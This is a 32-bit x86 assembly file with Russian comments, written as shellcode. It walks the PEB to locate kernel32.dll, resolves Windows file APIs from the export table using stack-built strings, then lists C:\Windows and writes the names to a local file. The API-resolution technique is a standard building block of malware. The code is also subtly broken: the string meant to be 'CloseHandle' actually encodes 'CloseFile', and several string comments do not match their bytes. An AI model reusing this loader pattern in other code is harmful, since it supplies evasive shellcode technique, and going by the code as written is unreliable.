BITS 32

; Объявляем все метки как глобальные, чтобы linker их видел
GLOBAL start
GLOBAL find_win_exec
GLOBAL loop_find_first_file_a
GLOBAL found_find_first_file_a
GLOBAL loop_find_next_file_a
GLOBAL found_find_next_file_a
GLOBAL loop_find_create_file_a
GLOBAL found_create_file_a
GLOBAL loop_find_write_file
GLOBAL found_write_file
GLOBAL loop_find_close_handle
GLOBAL found_close_handle
GLOBAL execute_main
GLOBAL process_file
GLOBAL close_and_exit
GLOBAL exit_loop

section .text

start:
  
find_win_exec:
  ; Allocate stack frame for variables
  push ebp
  mov ebp, esp
  sub esp, 0x100        ; Увеличим стек для большего буфера

  ; Save strings on the stack
  
  ; FindFirstFileA
  xor ebx, ebx
  push ebx ; \x00
  push word 0x4165
  push 0x6c694674
  push 0x73726946
  push 0x646e6946
  mov [ebp-0x04], esp ; var4 = "FindFirstFileA\x00"

  ; FindNextFileA
  xor ebx, ebx
  push ebx ; \x00
  push 0x41
  push 0x656c6946
  push 0x7478654e
  push 0x646e6946
  mov [ebp-0x08], esp ; var8 = "FindNextFileA\x00"

  ; CreateFileA (для создания/открытия файла)
  xor ebx, ebx
  push ebx ; \x00
  push 0x41656c
  push 0x69466574
  push 0x61657243
  mov [ebp-0x0c], esp ; var_c = "CreateFileA\x00"

  ; WriteFile (для записи в файл)
  xor ebx, ebx
  push ebx ; \x00
  push 0x65
  push 0x6c694665
  push 0x74697257
  mov [ebp-0x10], esp ; var10 = "WriteFile\x00"

  ; CloseHandle (для закрытия файла)
  xor ebx, ebx
  push ebx ; \x00
  push 0x65
  push 0x6c694665
  push 0x736f6c43
  mov [ebp-0x14], esp ; var14 = "CloseHandle\x00"

  ; Путь для поиска: C:\Windows\*
  xor ebx, ebx
  push ebx ; \x00
  push ebx ; \x00
  push ebx ; \x00
  push ebx ; \x00
  push 0x2a5c7377       ; "dows"
  push 0x6f646e69       ; "\Win"
  push 0x575c3a43           ; "C:"
  mov [ebp-0x18], esp   ; var18 = "C:\Windows\*\x00"

  ; Путь к выходному файлу: C:\secret_dir\content.txt
  xor ebx, ebx
  push ebx              ; \x00 (терминатор)
  push ebx              ; \x00
  push ebx              ; \x00
  push ebx              ; \x00
  push 0x74       ; ".txt"
  push 0x78742e74       ; "tent"
  push 0x6e65746e         ; "con" (3 байта)
  push 0x6f635c72       ; "_dir"
  push 0x69645f74       ; "cret"
  push 0x65726365       ; ":\se"
  push 0x735c3a43            ; "C" (1 байт)
  mov [ebp-0x1c], esp   ; var1c = "C:\secret_dir\content.txt\x00"

  ; Get kernel32.dll base address
  xor eax, eax
  xor ecx, ecx
  mov cl, 0x30
  mov ebx, fs:[ecx]

  mov ebx, [ebx + 0x0c]
  mov ebx, [ebx + 0x14]

  mov ebx, [ebx]
  mov ebx, [ebx]
  ; kernel32.dll base
  mov ebx, [ebx + 0x10]
  
  mov [ebp-0x20], ebx ; save base address

  ; Get PE signature
  mov edx, [ebx + 0x3c] ; RVA
  add edx, ebx

  ; Get Export Table + 0x78
  mov edx, [edx + 0x78] ; RVA
  add edx, ebx

  ; Get number of exported functions
  mov ecx, [edx + 0x14]
  mov [ebp-0x24], ecx

  ; Get address table rva
  mov esi, [edx + 0x1c]
  ; Get address table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x28], esi

  ; Get name table rva
  mov esi, [edx + 0x20]
  ; Get name table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x2c], esi

  ; Get ordinary table rva
  mov esi, [edx + 0x24]
  ; Get ordinary table
  add esi, ebx
  ; Save on the stack
  mov [ebp-0x30], esi
  
  xor eax, eax
  mov edx, ecx

; Поиск FindFirstFileA
loop_find_first_file_a:
  mov edi, [ebp-0x2c]    ; name table
  mov esi, [ebp-0x04]    ; var4 = "FindFirstFileA\x00"
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 14
  repe cmpsb

  jz found_find_first_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_first_file_a

found_find_first_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x30]
  mov edx, [ebp-0x28] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x34], eax ; Save FindFirstFileA address

  xor eax, eax
  mov edx, [ebp-0x24]
  
; Поиск FindNextFileA
loop_find_next_file_a:
  mov edi, [ebp-0x2c] ; name table
  mov esi, [ebp-0x08] ; FindNextFileA 
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 13
  repe cmpsb

  jz found_find_next_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_next_file_a

found_find_next_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x30]
  mov edx, [ebp-0x28] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x38], eax ; Save FindNextFileA address

  xor eax, eax
  mov edx, [ebp-0x24]

; Поиск CreateFileA
loop_find_create_file_a:
  mov edi, [ebp-0x2c] ; name table
  mov esi, [ebp-0x0c] ; CreateFileA
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 11          ; Длина "CreateFileA"
  repe cmpsb

  jz found_create_file_a
  
  inc eax
  cmp eax, edx
  jb loop_find_create_file_a

found_create_file_a:
  ; Get ordinal number
  mov ecx, [ebp-0x30]
  mov edx, [ebp-0x28] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x3c], eax ; Save CreateFileA address

  xor eax, eax
  mov edx, [ebp-0x24]

; Поиск WriteFile
loop_find_write_file:
  mov edi, [ebp-0x2c] ; name table
  mov esi, [ebp-0x10] ; WriteFile
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 9           ; Длина "WriteFile"
  repe cmpsb

  jz found_write_file
  
  inc eax
  cmp eax, edx
  jb loop_find_write_file

found_write_file:
  ; Get ordinal number
  mov ecx, [ebp-0x30]
  mov edx, [ebp-0x28] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x40], eax ; Save WriteFile address

  xor eax, eax
  mov edx, [ebp-0x24]

; Поиск CloseHandle
loop_find_close_handle:
  mov edi, [ebp-0x2c] ; name table
  mov esi, [ebp-0x14] ; CloseHandle
  xor ecx, ecx

  cld 
  mov edi, [edi+eax*4]
  add edi, ebx

  add cx, 11          ; Длина "CloseHandle"
  repe cmpsb

  jz found_close_handle
  
  inc eax
  cmp eax, edx
  jb loop_find_close_handle

found_close_handle:
  ; Get ordinal number
  mov ecx, [ebp-0x30]
  mov edx, [ebp-0x28] ; addr_table
  
  mov ax, [ecx + eax*2]
  mov eax, [edx + eax*4]
  add eax, ebx

  mov [ebp-0x44], eax ; Save CloseHandle address


; --------- MAIN PAYLOAD ---------
execute_main:

  ; Сначала создадим/откроем выходной файл
  ; CreateFileA parameters:
  ; lpFileName = [ebp-0x1c] (путь к content.txt)
  ; dwDesiredAccess = 0x40000000 (GENERIC_WRITE)
  ; dwShareMode = 0
  ; lpSecurityAttributes = 0
  ; dwCreationDisposition = 2 (CREATE_ALWAYS)
  ; dwFlagsAndAttributes = 0x80 (FILE_ATTRIBUTE_NORMAL)
  ; hTemplateFile = 0

  push 0                ; hTemplateFile
  push 0x80             ; FILE_ATTRIBUTE_NORMAL
  push 2                ; CREATE_ALWAYS
  push 0                ; lpSecurityAttributes = NULL
  push 0                ; dwShareMode = 0
  push 0x40000000       ; GENERIC_WRITE
  mov eax, [ebp-0x1c]   ; lpFileName
  push eax

  mov eax, [ebp-0x3c]   ; CreateFileA address
  call eax

  cmp eax, -1           ; Check if INVALID_HANDLE_VALUE
  jz exit_loop
  
  mov [ebp-0x48], eax   ; Save file handle

  ; Начинаем поиск файлов в C:\Windows
  mov esi, [ebp-0x18]   ; "C:\Windows\*"
  xor ebx, ebx
  
  ; Выделим место в стеке для WIN32_FIND_DATA структуры
  sub esp, 0x200        ; ~ 592 bytes for WIN32_FIND_DATA
  mov [ebp-0x4c], esp   ; Save buffer address
  
  push esp              ; lpFindFileData
  push esi              ; C:\Windows\*
  
  mov eax, [ebp-0x34]   ; FindFirstFileA
  call eax

  cmp eax, -1           ; Check if INVALID_HANDLE_VALUE
  jz close_and_exit

  mov [ebp-0x50], eax   ; Save search handle

  ; Обрабатываем первый найденный файл/директорию
process_file:
  ; Получаем имя файла из структуры WIN32_FIND_DATA
  ; cFileName находится по смещению 44 (0x2C) от начала структуры
  mov eax, [ebp-0x4c]   ; Buffer address
  add eax, 44           ; Point to cFileName
  mov [ebp-0x54], eax   ; Save file/dir name address

  ; Записываем имя в файл
  ; WriteFile parameters:
  ; hFile = [ebp-0x48]
  ; lpBuffer = file/dir name
  ; nNumberOfBytesToWrite = длина строки (будем писать пока не встретим 0)
  ; lpNumberOfBytesWritten = временный буфер в стеке
  ; lpOverlapped = 0

  ; Сначала вычислим длину строки
  push edi
  push esi
  mov edi, [ebp-0x54]   ; имя файла
  xor ecx, ecx
  dec ecx               ; ecx = FFFFFFFF для максимального поиска
  xor al, al            ; ищем 0
  cld
  repne scasb
  not ecx
  dec ecx               ; ecx = длина строки
  mov [ebp-0x58], ecx   ; сохраняем длину
  pop esi
  pop edi

  ; Добавляем перевод строки (CRLF)
  ; Сначала запишем имя файла
  sub esp, 8            ; место для lpNumberOfBytesWritten
  mov [ebp-0x5c], esp   ; сохраняем указатель
  
  push 0                ; lpOverlapped = NULL
  push dword [ebp-0x5c] ; lpNumberOfBytesWritten
  push dword [ebp-0x58] ; nNumberOfBytesToWrite (длина имени)
  push dword [ebp-0x54] ; lpBuffer (имя файла)
  push dword [ebp-0x48] ; hFile

  mov eax, [ebp-0x40]   ; WriteFile address
  call eax

  ; Теперь запишем CRLF (0x0D, 0x0A)
  mov word [ebp-0x60], 0x0A0D  ; CRLF
  sub esp, 8            ; место для lpNumberOfBytesWritten
  mov [ebp-0x64], esp   ; сохраняем указатель
  
  push 0                ; lpOverlapped = NULL
  push dword [ebp-0x64] ; lpNumberOfBytesWritten
  push 2                ; nNumberOfBytesToWrite (2 байта)
  lea eax, [ebp-0x60]   ; lpBuffer (CRLF)
  push eax
  push dword [ebp-0x48] ; hFile

  mov eax, [ebp-0x40]   ; WriteFile address
  call eax

  ; Ищем следующий файл
  mov eax, [ebp-0x50]   ; Search handle
  push dword [ebp-0x4c] ; lpFindFileData
  push eax              ; hFindFile

  mov eax, [ebp-0x38]   ; FindNextFileA address
  call eax

  test eax, eax         ; if (FALSE)
  jnz process_file      ; если есть еще файлы, продолжаем

  ; Закрываем handle поиска
  mov eax, [ebp-0x50]   ; Search handle
  push eax
  mov eax, [ebp-0x44]   ; CloseHandle address
  call eax

close_and_exit:
  ; Закрываем выходной файл
  mov eax, [ebp-0x48]   ; File handle
  push eax
  mov eax, [ebp-0x44]   ; CloseHandle address
  call eax
  
exit_loop:
  ; Восстанавливаем стек
  mov esp, ebp
  pop ebp
  ret